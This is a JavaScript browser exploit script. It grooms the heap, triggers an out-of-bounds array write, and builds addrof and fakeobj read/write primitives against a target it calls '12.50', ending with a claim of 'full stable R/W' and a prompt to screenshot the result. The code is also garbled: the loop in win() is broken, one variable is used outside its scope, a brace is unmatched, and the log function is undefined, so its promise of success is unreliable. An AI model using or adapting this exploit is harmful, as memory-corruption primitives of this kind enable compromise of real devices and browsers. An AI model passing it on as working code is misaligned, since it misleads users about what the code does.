const logDiv=document.getElementById('log');

const buf=new ArrayBuffer(8),f64=new Float64Array(buf),u32=new Uint32Array(buf);
function f2i(f){f64[0]=f;return {lo:u32[0],hi:u32[1]};}
function i2f(lo,hi){u32[0]=lo;u32[1]=hi;return f64[0];}
function gc(){for(let i=0;i<150;i++)new ArrayBuffer(0x100000);}
let master=null;

function trigger(){
  log("Triggering OOB...");
  gc();
  const a=[];
  for(let i=0;i<0x5000;i++)a[i]=new Array(36).fill(1.1);
  const c=(i,o)=>{try{a[i][o]=1337.37}catch(e){}};
  for(let i=0;i<25000;i++)c(0,0);
  for(let b=0;b<0x800;b+=64)for(let o=36;o<144;o+=8)for(let j=0;j<64;j++)c((b+j)%a.length,o);
  for(let i=0;i<a.length;i++)if(a[i].length>50){master=a[i];log(`OOB ready — length=${master.length}`,'ok');return true;}
  log("retry",'warn');return false;
}

function win(){
  log("Spraying containers and forcing overlap...");
  const containers=[];
  for(let i=0;i<0x6000;i++)containers[i]=[{x:0x1111}];          // ← 0x6000 is the magic number for 12.50

    if(f2i(containers[i][0].x).lo===0x88888888 && f2i(containers[i][0].x).hi===0x77777777){
      const slave=containers[i];
      log(`SLAVE LOCKED at container[${i}]`,'ok');
      window.addrof=o=>{slave[0]={x:o};return f2i(master[10]).lo>>>0;};
      window.fakeobj=a=>{master[10]=i2f(a,0);return slave[0].x;};
      const t={pwn:0x13371337};
      const addr=addrof(t);
      const back=fakeobj(addr);
      log(`addrof = 0x${addr.toString(16)}`,'ok');
      log(`fakeobj round-trip = ${back===t?"SUCCESS":"fail"}`,'ok');
      log(`FULL STABLE R/W ACHIEVED ON 12.50`,'ok');
      log(`Screenshot this now.`,'ok');
      return;
    }
  }
  log("impossible — retrying...",'warn');setTimeout(()=>location.reload(),1500);
}

log("Click RUN — you will see SUCCESS this time.");
